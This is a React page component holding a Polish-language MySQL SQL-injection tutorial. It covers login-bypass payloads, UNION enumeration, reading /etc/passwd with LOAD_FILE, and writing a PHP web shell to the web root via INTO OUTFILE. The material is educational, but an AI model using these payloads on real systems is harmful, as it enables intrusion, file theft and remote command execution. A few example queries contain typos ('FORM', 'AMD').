import sql_injection_types from '../../../assets/sql_injection_types.png';
import sql_injection_condition from '../../../assets/sql_injection_condition.png';
import sql_union from '../../../assets/sql_union.png';
import sql_write_file_example from '../../../assets/sql_write_file_example.png';
import { Link } from 'react-router-dom';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const MySQL = () => {

    return(
        <section>
            <h1>MySql</h1>
            <h1>SQL Injections type</h1>
            <img src={sql_injection_types} />
            <p>W prostych przypadkach wynik zarówno zamierzonego, jak i nowego zapytania może zostać wydrukowany bezpośrednio na interfejsie użytkownika i możemy go bezpośrednio odczytać. Nazywa się to wstrzyknięciem SQL w paśmie i ma dwa typy: oparte na Unii i oparte na błędach.</p>
            <p>W bardziej skomplikowanych przypadkach wynik może nie zostać wydrukowany, więc możemy wykorzystać logikę SQL do odzyskania wyniku znak po znaku. Nazywa się to wstrzyknięciem ślepego SQL i ma również dwa typy: oparte na wartościach logicznych i oparte na czasie.</p>
            <p>Dzięki wstrzykiwaniu SQL opartemu na wartościach logicznych możemy używać instrukcji warunkowych SQL do kontrolowania, czy strona w ogóle zwraca jakiekolwiek dane wyjściowe, „tj. pierwotną odpowiedź na zapytanie”, jeśli nasza instrukcja warunkowa zwróci wartość true. Jeśli chodzi o zastrzyki SQL oparte na czasie, używamy instrukcji warunkowych SQL, które opóźniają odpowiedź strony, jeśli instrukcja warunkowa zwróci wartość true przy użyciu funkcji Sleep().</p>
            <p>Wreszcie, w niektórych przypadkach możemy nie mieć bezpośredniego dostępu do wyników, więc być może będziemy musieli skierować dane wyjściowe do zdalnej lokalizacji, „tj. rekordu DNS”, a następnie spróbować je stamtąd odzyskać. Nazywa się to pozapasmowym wstrzykiwaniem (Out-of-band) SQL.</p>
        
            <p>Zanim zaczniemy podważać logikę aplikacji internetowej i próbować ominąć uwierzytelnianie, musimy najpierw sprawdzić, czy formularz logowania jest podatny na wstrzyknięcie SQL. W tym celu spróbujemy dodać po naszej nazwie użytkownika jeden z poniższych ładunków i sprawdzimy, czy spowoduje to jakieś błędy lub zmieni zachowanie strony:</p>
            <table>
                <thead>
                  <tr>
                        <th>Znak</th>
                        <th>Encoding</th>
                   </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>"</td>
                         <td>%22</td>
                    </tr>
                    <tr>
                        <td>#</td>
                       <td>%23</td>
                    </tr>
                    <tr>
                        <td>'</td>
                        <td>%27</td>
                    </tr>
                    <tr>
                        <td>)</td>
                        <td>%29</td>
                    </tr>
                    <tr>
                        <td>;</td>
                        <td>%3B</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>Uwaga: w niektórych przypadkach może być konieczne użycie wersji ładunku zakodowanej w adresie URL. Przykładem tego jest umieszczenie naszego ładunku bezpośrednio w adresie URL „tj. Żądanie HTTP GET”.</p>
            </div>

            <p>Aby ominąć uwierzytelnianie, potrzebowalibyśmy, aby zapytanie zawsze zwracało wartość <span className='important'>true</span>, niezależnie od wprowadzonej nazwy użytkownika i hasła. Aby to zrobić, możemy nadużyć operatora <span className='important'>OR</span> w naszym wstrzykiwaniu SQL.
                Jak wspomniano wcześniej, dokumentacja MySQL dotycząca pierwszeństwa operacji stwierdza, że <span className='important'>​​operator AND będzie oceniany przed operatorem OR</span>. Oznacza to, że jeśli w całym zapytaniu znajduje się co najmniej jeden warunek <span className='important'>PRAWDA</span> wraz z operatorem <span className='important'>OR</span>, całe zapytanie przyjmie wartość <span className='important'>PRAWDA</span>, ponieważ operator <span className='important'>OR</span> zwróci <span className='important'>PRAWDA</span>, jeśli jeden z jego operandów ma wartość <span className='important'>PRAWDA</span>.
                Przykładem warunku, który zawsze zwróci wartość <span className='important'>true, jest „1” = „1”</span>. Jednakże, aby zapytanie SQL działało i zachowało parzystą liczbę cudzysłowów, zamiast używać („1” = „1”), usuniemy ostatni cudzysłów i użyjemy („1” = „1), więc pozostały pojedynczy cytat z pierwotnego zapytania byłby na swoim miejscu.</p>
            <p>admin<span className='error'>' or '1'='1</span></p>
            <p>SELECT * FROM logins WHERE username='admin<span className='error'>' or '1'='1'</span> AND password = 'something';</p>
            <p>Jeżeli username jest <span className='important'>admin</span></p>
            <p><span className='important'>OR</span></p>
            <p>Jeżeli <span className='important'>1=1</span> zwróć <span className='important'>true</span>, które zawsze zwraca <span className='important'>true</span></p>
            <p><span className='important'>AND</span></p>
            <p>Password jest <span className='important'>obojętnie czym</span></p>

            <img src={sql_injection_condition} />

            <div className='waring'>
                <p>
                Uwaga: ładunek, którego użyliśmy powyżej, jest jednym z wielu ładunków obejścia uwierzytelniania, których możemy użyć do obalenia logiki uwierzytelniania. Pełną listę ładunków obejścia uwierzytelniania SQLi można znaleźć w <Link to='https://github.com/FilipowiczP/PayloadsAllTheThings/tree/master/SQL%20Injection'>PayloadAllTheThings</Link>, z których każdy działa na określonym typie zapytań SQL.</p>
            </div>
            
            <hr />

            <h2>Komentarze</h2>
            <p>Jak każdy inny język, SQL pozwala również na użycie komentarzy. Komentarze służą do dokumentowania zapytań lub ignorowania określonej części zapytania. Możemy używać dwóch typów komentarzy liniowych z MySQL <span className='important'>'-- '</span> i <span className='important'>#</span>, oprócz komentarza wbudowanego /**/ (chociaż nie jest to zwykle używane przy iniekcjach SQL). <span className='important'>'-- '</span> może być użyte w następujący sposób:
            </p>

            <div className='waring'>
                <p>Uwaga: W SQL użycie tylko dwóch myślników nie wystarczy, aby rozpocząć komentarz. Zatem po nich musi być pusta spacja, więc komentarz zaczyna się od (--) i kończy się spacją. Czasami jest to adres URL zakodowany jako (--+), ponieważ spacje w adresach URL są kodowane jako (+). Aby było to jasne, dodamy kolejny (-) na końcu (-- -), aby pokazać użycie znaku spacji.</p>
            </div>
            <div className='waring'>
                <p>Wskazówka: jeśli wprowadzasz ładunek w adresie URL w przeglądarce, symbol (#) jest zwykle uważany za znacznik i nie będzie przekazywany jako część adresu URL. Aby użyć (#) jako komentarza w przeglądarce, możemy użyć „%23”, który jest symbolem (#) zakodowanym w adresie URL.</p>
            </div>

            <p className='important'>admin'-- </p>
            <p>SELECT * FROM logins WHERE username='admin<span className='error'>'-- </span>' AND password = 'something';</p>

            <p>SQL obsługuje użycie nawiasów, jeśli aplikacja musi najpierw sprawdzić określone warunki. Wyrażenia w nawiasach mają pierwszeństwo przed innymi operatorami i są oceniane w pierwszej kolejności.</p>
            <p>Aby pomyślnie wykonać zapytanie, będziemy musieli dodać nawias zamykający. Spróbujmy użyć nazwy użytkownika <span className='important'>admin')-- </span> - aby zamknąć i skomentować resztę.</p>
            <p>SELECT * FORM logins WHERE (username='admin' AND id > 1) AMD password = 'xyz'</p>
            <p>SELECT * FORM logins WHERE (username='<span className='important'>admin')-- </span><span className='error'>AND id > 1) AMD password = 'xyz'</span></p>

            <hr />

            <h2>Union</h2>
            <p>Łączenie zapytań SELECT</p>
            <div className='waring'>
                <p>Uwaga: Typy danych wybranych kolumn na wszystkich pozycjach powinny być takie same.</p>
            </div>

            <p>Żeby sprawdzić ilość kolumn możemy użyć</p>
            <p className='important'>ORDER BY</p>
            <p className='important'>UNION</p>

            <p>Sordująć po kolei kolumny <span className='important'>' order by 1-- - (2..4)</span></p>
            <div className='waring'>
                <p>Przypomnienie: dodajemy dodatkowy myślnik (-) na końcu, aby pokazać, że po (--) jest spacja.</p>
            </div>
            <p>Aż pojawi się błąd</p>

            <p>Przykład z Union</p>
            <p>Wpisujemy kolejno kolumny aż cyfry zajmą pozycję</p>
            <p>Wstrzykujemy <span className='important'>cn' UNION select 1,2,3,4-- -</span></p>
            <img src={sql_union} />

            <hr />

            <h2>Czytanie plików</h2>
            <ol>
                <li>
                    sprawdzemy jakim jesteśmy userem <span className='important'>cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -</span>
                </li>
                <li>
                    sprawdzemy uprawnienia (interesuje nas FILE) <span className='important'>cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</span>
                </li>
                <li>
                    wstrzykujemy ścieżkę do pliku <span className='important'>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</span>
                </li>
            </ol>
            <p>Można przeczytać kod źródłowy strony wskazując na pliki np./var/www/html/search.php</p>
            <div className='waring'>
                <p>Przypomnienie: po takim sprawdzeniu wyrenderuje się strona w stronie, należy wejść w kod źródłowy strony by ją odczytać.</p>
            </div>

            <hr />

            <h2>Zapisywanie w plikach</h2>
            <p>Potrzebujemy 3 rzeczy</p>
            <ol>
                <li>Użytkownik z włączonymi uprawnieniami <span className='important'>FILE</span></li>
                <li>Globalna zmienna <span className='important'>secure_file_priv</span> MySQL nie jest włączona</li>
                <li>Dostęp do zapisu do lokalizacji, do której chcemy pisać na serwerze zaplecza</li>
            </ol>
            <p>Zmienna secure_file_priv służy do określenia, skąd mają być odczytywane/zapisywane pliki. Pusta wartość pozwala nam czytać pliki z całego systemu plików. W przeciwnym razie, jeśli ustawiony jest określony katalog, będziemy mogli czytać tylko z folderu określonego przez zmienną. Z drugiej strony NULL oznacza, że ​​nie możemy czytać/zapisywać z żadnego katalogu. W MariaDB ta zmienna jest domyślnie ustawiona na pustą, co pozwala nam czytać/zapisywać do dowolnego pliku, jeśli użytkownik ma uprawnienie FILE. Jednak MySQL używa /var/lib/mysql-files jako folderu domyślnego. Oznacza to, że odczytanie plików poprzez wstrzyknięcie MySQL nie jest możliwe przy ustawieniach domyślnych. Co gorsza, niektóre nowoczesne konfiguracje domyślnie mają wartość NULL, co oznacza, że ​​nie możemy czytać/zapisywać plików w żadnym miejscu w systemie.</p>
            <p className='important'>SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"</p>
            <p className='important'>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</p>
            <p>Jeżeli wartość <span className='important'>variable_value</span> jest pusta to mamy dostęp do pełnej lokalizacji</p>

            <p className='important'>SELECT * from users INTO OUTFILE '/tmp/credentials';</p>
            <ExampleFrame screen={sql_write_file_example}/>

            <p>Możemy załadować web shell</p>
            
            <p className='important'>cn' union select "",'{'<'}?php system($_REQUEST[0]); ?{'>'}', "", "" into outfile '/var/www/html/shell.php'-- -</p>
            <p>http://SERVER_IP:PORT/shell.php?0=id</p>
        </section>
    )
}

export default MySQL;